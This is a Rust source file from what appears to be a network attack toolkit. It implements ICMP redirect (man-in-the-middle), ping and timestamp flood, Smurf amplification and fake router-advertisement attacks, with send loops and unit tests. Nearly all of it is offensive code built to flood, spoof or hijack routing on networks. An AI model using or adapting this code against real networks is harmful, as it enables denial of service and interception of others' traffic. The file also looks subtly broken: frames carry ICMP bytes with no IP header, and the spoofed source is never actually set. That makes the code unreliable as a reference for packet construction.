//! ICMP Attack Implementations

use super::packet::{IcmpPacket, IcmpType, RedirectCode};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// ICMP Redirect Attack (MITM)
///
/// Sends ICMP Redirect messages to manipulate victim's routing table,
/// redirecting traffic through attacker's machine
#[derive(Debug, Clone)]
pub struct IcmpRedirectAttack {
    pub fake_gateway: Ipv4Addr,
    pub target_network: Ipv4Addr,
    pub redirect_code: RedirectCode,
    pub interval_ms: u32,
}

impl IcmpRedirectAttack {
    pub fn new(fake_gateway: Ipv4Addr, target: Ipv4Addr) -> Self {
        Self {
            fake_gateway,
            target_network: target,
            redirect_code: RedirectCode::Host,
            interval_ms: 1000,
        }
    }

    pub fn for_network(fake_gateway: Ipv4Addr, target: Ipv4Addr) -> Self {
        Self {
            fake_gateway,
            target_network: target,
            redirect_code: RedirectCode::Network,
            interval_ms: 1000,
        }
    }

    pub fn build_packet(&self, original_ip_header: &[u8]) -> IcmpPacket {
        IcmpPacket::redirect(self.redirect_code, self.fake_gateway, original_ip_header)
    }
}

/// ICMP Flood Attack
///
/// Floods target with ICMP packets to:
/// - Exhaust bandwidth
/// - Consume CPU resources
/// - DoS network services
#[derive(Debug, Clone)]
pub struct IcmpFloodAttack {
    pub packet_type: IcmpType,
    pub rate_pps: u32,
    pub payload_size: usize,
}

impl IcmpFloodAttack {
    /// Create ping flood (Echo Request)
    pub fn ping_flood(rate_pps: u32) -> Self {
        Self {
            packet_type: IcmpType::EchoRequest,
            rate_pps,
            payload_size: 56, // Standard ping payload
        }
    }

    /// Create timestamp flood
    pub fn timestamp_flood(rate_pps: u32) -> Self {
        Self {
            packet_type: IcmpType::Timestamp,
            rate_pps,
            payload_size: 20,
        }
    }

    pub fn build_packet(&self, seq: u16) -> IcmpPacket {
        let payload = vec![0x42; self.payload_size];
        match self.packet_type {
            IcmpType::EchoRequest => IcmpPacket::echo_request(1, seq, payload),
            IcmpType::Timestamp => {
                // Simplified timestamp packet
                let mut data = vec![0u8; 4]; // ID and sequence
                data.extend_from_slice(&seq.to_be_bytes());
                data.extend_from_slice(&payload);
                let mut pkt = IcmpPacket {
                    icmp_type: IcmpType::Timestamp,
                    code: 0,
                    checksum: 0,
                    data,
                };
                pkt.calculate_checksum();
                pkt
            }
            _ => IcmpPacket::echo_request(1, seq, payload),
        }
    }
}

/// ICMP Amplification Attack (Smurf)
///
/// Sends ICMP Echo Requests with spoofed source to broadcast address,
/// causing all hosts to reply to victim (amplification DoS)
#[derive(Debug, Clone)]
pub struct IcmpAmplificationAttack {
    pub victim_ip: Ipv4Addr,
    pub broadcast_addr: Ipv4Addr,
    pub rate_pps: u32,
    pub amplification_factor: u32,
}

impl IcmpAmplificationAttack {
    pub fn new(victim: Ipv4Addr, broadcast: Ipv4Addr) -> Self {
        Self {
            victim_ip: victim,
            broadcast_addr: broadcast,
            rate_pps: 100,
            amplification_factor: 0, // Will be calculated based on responses
        }
    }

    /// Build echo request with spoofed source (victim IP)
    pub fn build_packet(&self, seq: u16) -> IcmpPacket {
        // This will be sent TO broadcast, FROM victim (spoofed)
        IcmpPacket::echo_request(1, seq, vec![0x42; 56])
    }
}

/// ICMP Router Discovery Manipulation
///
/// Sends fake Router Advertisement messages to become default gateway
#[derive(Debug, Clone)]
pub struct IcmpRouterDiscoveryAttack {
    pub attacker_ip: Ipv4Addr,
    pub preference: u32,
    pub lifetime: u16,
}

impl IcmpRouterDiscoveryAttack {
    pub fn new(router_ip: Ipv4Addr) -> Self {
        Self {
            attacker_ip: router_ip,
            preference: 0xFFFFFFFF, // Highest preference
            lifetime: 1800,         // 30 minutes
        }
    }

    pub fn build_packet(&self) -> IcmpPacket {
        IcmpPacket::router_advertisement(
            1, // One address
            2, // Address entry size (2 * 4 bytes)
            self.lifetime,
            vec![(self.attacker_ip, self.preference)],
        )
    }
}

#[async_trait]
impl Attack for IcmpRedirectAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);
        let fake_ip_header = vec![
            0x45, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
        ];

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let icmp_bytes = self.build_packet(&fake_ip_header).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                icmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "ICMP Redirect"
    }
}

#[async_trait]
impl Attack for IcmpFloodAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut seq = 0u16;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let icmp_bytes = self.build_packet(seq).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                icmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            seq = seq.wrapping_add(1);
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "ICMP Flood"
    }
}

#[async_trait]
impl Attack for IcmpAmplificationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut seq = 0u16;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let icmp_bytes = self.build_packet(seq).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                icmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            seq = seq.wrapping_add(1);
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "ICMP Amplification (Smurf)"
    }
}

#[async_trait]
impl Attack for IcmpRouterDiscoveryAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(5);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let icmp_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x01]), // All-hosts multicast
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                icmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "ICMP Router Discovery"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_redirect_attack() {
        let attack =
            IcmpRedirectAttack::new(Ipv4Addr::new(10, 0, 0, 1), Ipv4Addr::new(192, 168, 1, 100));

        let ip_header = vec![0x45, 0x00, 0x00, 0x1c];
        let packet = attack.build_packet(&ip_header);

        assert_eq!(packet.icmp_type, IcmpType::Redirect);
        assert_eq!(packet.code, RedirectCode::Host as u8);
    }

    #[test]
    fn test_ping_flood() {
        let attack = IcmpFloodAttack::ping_flood(1000);
        let packet = attack.build_packet(1);

        assert_eq!(packet.icmp_type, IcmpType::EchoRequest);
        assert!(packet.data.len() >= 56);
    }

    #[test]
    fn test_amplification_attack() {
        let attack = IcmpAmplificationAttack::new(
            Ipv4Addr::new(192, 168, 1, 100),
            Ipv4Addr::new(192, 168, 1, 255),
        );

        let packet = attack.build_packet(1);
        assert_eq!(packet.icmp_type, IcmpType::EchoRequest);
    }

    #[test]
    fn test_router_discovery() {
        let attack = IcmpRouterDiscoveryAttack::new(Ipv4Addr::new(10, 0, 0, 1));
        let packet = attack.build_packet();

        assert_eq!(packet.icmp_type, IcmpType::RouterAdvertisement);
        assert!(packet.data.len() >= 12); // Header + at least one address entry
    }
}
